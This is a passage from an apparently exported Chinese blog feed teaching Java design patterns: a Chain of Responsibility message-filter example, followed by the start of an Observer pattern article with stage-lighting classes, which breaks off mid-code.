class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Msg&#123;"</span> +<br>                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">", msg='"</span> + msg + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Filter</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTMLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'['</span>);<br>        r = r.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">']'</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensitiveFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replaceAll(<span class="hljs-string">"Hacker"</span>, <span class="hljs-string">" "</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FaceFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">":)"</span>, <span class="hljs-string">"^V^"</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">"xf.com"</span>, <span class="hljs-string">"https://xf.com"</span>);<br>        msg.setMsg(r);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//class FilterChain&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br>    List&lt;Filter&gt; filters = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-comment">/*public void add(Filter filter)&#123;<br>        filters.add(filter);<br>    &#125;*/</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> FilterChain <span class="hljs-title">add</span><span class="hljs-params">(Filter filter)</span></span>&#123;<br>        filters.add(filter);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>&#123;<br>        <span class="hljs-keyword">for</span> (Filter f :<br>                filters) &#123;<br>            f.doFilter(msg);<br>        &#125;<br>    &#125;<br>&#125;<br><br>Main<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Msg msg = <span class="hljs-keyword">new</span> Msg();<br>        msg.setMsg(<span class="hljs-string">"插播一条消息&lt;script&gt;:本网站已经被我Hacker了,交钱信息不外漏:)，联系方式:xf.com"</span>);<br><br>        FilterChain fc = <span class="hljs-keyword">new</span> FilterChain();<br>        <span class="hljs-comment">/*fc.add(new HTMLFilter());<br>        fc.add(new SensitiveFilter());*/</span><br>        <span class="hljs-comment">// 编程小技巧,将返回值改为FilterChain类型</span><br>        fc.add(<span class="hljs-keyword">new</span> HTMLFilter())<br>                .add(<span class="hljs-keyword">new</span> SensitiveFilter());<br>        <span class="hljs-comment">// 再创建一个Filter链</span><br>        FilterChain fc2 = <span class="hljs-keyword">new</span> FilterChain();<br>        fc2.add(<span class="hljs-keyword">new</span> FaceFilter()).add(<span class="hljs-keyword">new</span> URLFilter());<br><br>        <span class="hljs-comment">//此时完全可以将FileChain也实现Filter接口</span><br>        fc.add(fc2);<br>        fc.doFilter(msg);<br>        System.out.println(msg);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里我们就可以看出Code3就很好的将代码的数量大大减少。</p>
<p>到了现在，只差最后一点需求了，由FilterChain中的某一个Filter决定链条是否继续。<br>什么意思呢？先看一下图</p>
<p><img src="https://qiniuyun.fxhstudy.com/ChainOfResponsibility3.png" srcset="/img/loading.gif"><br></p>
<p>当数据在Filter2处理完成时，发现含有敏感词，此时就不用Filter3处理就结束了。</p>
<p>但怎么实现呢？这个感觉还是比较复杂的</p>
<p>这个必须要在Filter内部进行过滤，是不能够写在FilterChain中的(影响扩展)<br>这里要将Filter接口中的 doFilter() 方法返回类型改为Boolean类型，那么在每一个实现Filter的方法中，<br>都需要返回Boolean值，然后判断如果为false，即退出。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Code5<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Msg</span></span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String msg;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getMsg</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMsg</span><span class="hljs-params">(String msg)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.msg = msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">"Msg&#123;"</span> +<br>                <span class="hljs-string">"name='"</span> + name + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">", msg='"</span> + msg + <span class="hljs-string">'\''</span> +<br>                <span class="hljs-string">'&#125;'</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Filter</span></span>&#123;<br>    <span class="hljs-function">Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HTMLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'['</span>);<br>        r = r.replace(<span class="hljs-string">'&gt;'</span>, <span class="hljs-string">']'</span>);<br>        msg.setMsg(r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SensitiveFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replaceAll(<span class="hljs-string">"Hacker"</span>, <span class="hljs-string">" "</span>);<br>        msg.setMsg(r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FaceFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">":)"</span>, <span class="hljs-string">"^V^"</span>);<br>        msg.setMsg(r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span> </span>&#123;<br>        String r = msg.getMsg();<br>        r = r.replace(<span class="hljs-string">"xf.com"</span>, <span class="hljs-string">"https://xf.com"</span>);<br>        msg.setMsg(r);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//class FilterChain&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterChain</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span></span>&#123;<br>    List&lt;Filter&gt; filters = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br><br>    <span class="hljs-comment">/*public void add(Filter filter)&#123;<br>        filters.add(filter);<br>    &#125;*/</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> FilterChain <span class="hljs-title">add</span><span class="hljs-params">(Filter filter)</span></span>&#123;<br>        filters.add(filter);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Boolean <span class="hljs-title">doFilter</span><span class="hljs-params">(Msg msg)</span></span>&#123;<br>        <span class="hljs-keyword">for</span> (Filter f :<br>                filters) &#123;<br>            <span class="hljs-keyword">if</span> (!f.doFilter(msg)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Msg msg = <span class="hljs-keyword">new</span> Msg();<br>        msg.setMsg(<span class="hljs-string">"插播一条消息&lt;script&gt;:本网站已经被我Hacker了,交钱信息不外漏:)，联系方式:xf.com"</span>);<br><br>        FilterChain fc = <span class="hljs-keyword">new</span> FilterChain();<br>        <span class="hljs-comment">/*fc.add(new HTMLFilter());<br>        fc.add(new SensitiveFilter());*/</span><br>        <span class="hljs-comment">// 编程小技巧,将返回值改为FilterChain类型</span><br>        fc.add(<span class="hljs-keyword">new</span> HTMLFilter())<br>                .add(<span class="hljs-keyword">new</span> SensitiveFilter());<br>        <span class="hljs-comment">// 再创建一个Filter链</span><br>        FilterChain fc2 = <span class="hljs-keyword">new</span> FilterChain();<br>        fc2.add(<span class="hljs-keyword">new</span> FaceFilter()).add(<span class="hljs-keyword">new</span> URLFilter());<br><br>        <span class="hljs-comment">//此时完全可以将FileChain也实现Filter接口</span><br>        fc.add(fc2);<br>        fc.doFilter(msg);<br>        System.out.println(msg);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>如果将SensitiveFilter类中返回值为true，则结果为：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Msg&#123;name=<span class="hljs-string">'null'</span>, msg=<span class="hljs-string">'插播一条消息[script]:本网站已经被我 了,交钱信息不外漏^V^，联系方式:https://xf.com'</span>&#125;<br></code></pre></div></td></tr></table></figure>

<p>如果将SensitiveFilter类中返回值为false，则结果为：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Msg&#123;name=<span class="hljs-string">'null'</span>, msg=<span class="hljs-string">'插播一条消息[script]:本网站已经被我 了,交钱信息不外漏:)，联系方式:xf.com'</span>&#125;<br></code></pre></div></td></tr></table></figure>

<p>是不是观察出来什么不一样了，当SensitiveFilter类中返回false，那么此时就不会再去调用fc2中的Filter。</p>
<p>好了，到这里责任链模式，思想就基本上🔒完了，如果想比较深入了解的话，可以去看看Java EE中FilterChain的API，如果还有哪天比较空闲的话，我会把这个API的实现说一下，毕竟这也算是设计模式中难度第二的模式。</p>
</font>]]></content>
      <categories>
        <category>程序猿</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>设计模式5-Observer</title>
    <url>/article/d38e334a.html</url>
    <content><![CDATA[<h2 id="观察者模式"><a href="#观察者模式" class="headerlink" title=" 观察者模式"></a><a href="https://www.runoob.com/design-pattern/observer-pattern.html" target="_blank" rel="noopener"> 观察者模式</a></h2><p><font size="4" face="PingFang SC">&emsp;&emsp;当对象间存在一对多关系时，则使用观察者模式（Observer Pattern）。比如，当一个对象被修改时，则会自动通知依赖它的对象。观察者模式属于<font coroleName="#FFB6C1" size="5" face="Open Sans"> 行为型模式 </font>。</p>
<p>如果想了解观察者模式的具体的介绍，菜鸟教程介绍得比较详细↓<br><a href="https://www.runoob.com/design-pattern/decorator-pattern.html" target="_blank" rel="noopener" class="LinkCard">菜鸟教程-观察者模式</a></p>
<h2 id="结构图"><a href="#结构图" class="headerlink" title="结构图"></a>结构图</h2><p><img src="https://qiniuyun.fxhstudy.com/Observer.png" srcset="/img/loading.gif" title="观察者模式"><br></p>
<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><p>优点：<br>1、观察者和被观察者是抽象耦合的。<br>2、建立一套触发机制。</p>
<p>缺点：<br>1、如果一个被观察者对象有很多的直接和间接的观察者的话，将所有的观察者都通知到会花费很多时间。<br>2、如果在观察者和观察目标之间有循环依赖的话，观察目标会触发它们之间进行循环调用，可能导致系统崩溃。<br>3、观察者模式没有相应的机制让观察者知道所观察的目标对象是怎么发生变化的，而仅仅只是知道观察目标发生了变化。</p>
<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>1、一个抽象模型有两个方面，其中一个方面依赖于另一个方面。将这些方面封装在独立的对象中使它们可以各自独立地改变和复用。<br>2、一个对象的改变将导致其他一个或多个对象也发生改变，而不知道具体有多少对象将发生改变，可以降低对象之间的耦合度。<br>3、一个对象必须通知其他对象，而并不知道这些对象是谁。<br>4、需要在系统中创建一个触发链，A对象的行为将影响B对象，B对象的行为将影响C对象……，可以使用观察者模式创建一种链式触发机制。</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>提出需求，我们知道一台戏中，当演员出场，此时灯光亮起，音乐响起，旁白响起。<br>这里我们模拟的就是当演员出场时，观察者(灯光、音乐和旁白)的动作。</p>
<p>代码也不难:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acter</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> act = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">private</span> Light l = <span class="hljs-keyword">new</span> Light();<br>    <span class="hljs-keyword">private</span> Music m = <span class="hljs-keyword">new</span> Music();<br>    <span class="hljs-keyword">private</span> Narrator n = <span class="hljs-keyword">new</span> Narrator();<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAct</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> act;<br>    &#125;<br><br>    <span class="hljs-comment">//耦合度比较高</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Acting</span><span class="hljs-params">()</span> </span>&#123;<br>        act = <span class="hljs-keyword">true</span>;<br>        l.turnOn();<br>        m.sound();<br>        n.ring();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Light</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOn</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"turnOn..."</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Music</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sound</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"sound..."</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Narrator</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ring</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"ring..."</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Act</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Acter acter = <span class="hljs-keyword">new</span> Acter();<br>        System.out.println(acter.isAct());<br>        acter.Acting();<br>        System.out.println(acter.isAct());<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>这里我们创建Light、Music和Narrator三个对象，将这三个对象定义在Acter对象中，当调用Acting()方法时，将act属性设为true，<br>灯亮、音乐和旁白响起。</p>
<p>我们在代码中也指出了弊端，同时将Light、Music和Narrator三个对象都放在了Acting中处理了，耦合度太高了。<br>再结合实际来讲，Music响起，不一定就是演员登场了，可能是某个转折点，观察者的动作不一定要耦合到被观察者身上。</p>
<p>那么此时我们要怎么解决呢？仔细分析逻辑会发现，只要当演员出场时，不管是灯、音乐还是旁白都会有相应的动作，那么我们就可以创建一个接口，然后观察者来实现我们这个接口,从而实现分离观察者和被观察者</p>
<p>代码如下:</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acter</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> act = <span class="hljs-keyword">false</span>;<br>    List&lt;Observer&gt; observers = <span class="hljs-keyword">new</span> ArrayList&lt;Observer&gt;();<br>    &#123;<br>        <span class="hljs-comment">//这里可以通过配置文件实现</span><br>        observers.add(<span class="hljs-keyword">new</span> Light());<br>        observers.add(<span class="hljs-keyword">new</span> Music());<br>        observers.add(<span class="hljs-keyword">new</span> Narrator());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isAct</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> act;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Acting</span><span class="hljs-params">()</span></span>&#123;<br>        act = <span class="hljs-keyword">true</span>;<br>        <span class="hljs-keyword">for</span> (Observer o : observers)&#123;<br>            o.actionOnActing();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Light</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">turnOn</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"turnOn..."</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">()</span> </span>&#123;<br>        turnOn();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Music</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">sound</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">"sound..."</span>);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">actionOnActing</span><span class="hljs-params">()</span> </span>&#123;<br>        sound();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Narrator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Observer</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">ring</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span 